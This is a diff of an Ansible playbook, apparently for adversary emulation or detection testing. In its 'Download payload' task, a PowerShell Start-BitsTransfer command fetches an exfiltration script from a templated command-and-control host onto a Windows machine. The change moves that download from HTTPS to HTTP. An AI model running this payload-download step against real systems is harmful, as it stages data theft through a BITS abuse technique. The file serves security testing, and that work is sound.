@@ -6,8 +6,9 @@
   tasks:
           - name: Download payload
             tags: always
+            # If you want to use HTTPS, make sure remote certificate is valid or a add root ca if self-signed
             win_shell: |
-              Start-BitsTransfer -Priority foreground -Source https://{{ cnc_fqdn }}:{{ cnc_port }}/{{ exfil_script_windows }} -Destination %TEMP%\bitsadmin_flag.ps1
+              Start-BitsTransfer -Priority foreground -Source http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ exfil_script_windows }} -Destination c:\TEMP\bitsadmin_flag.ps1
           - name: sleep for 10 seconds and continue with play if download was blocked or not
             tags: always
             wait_for: timeout=10
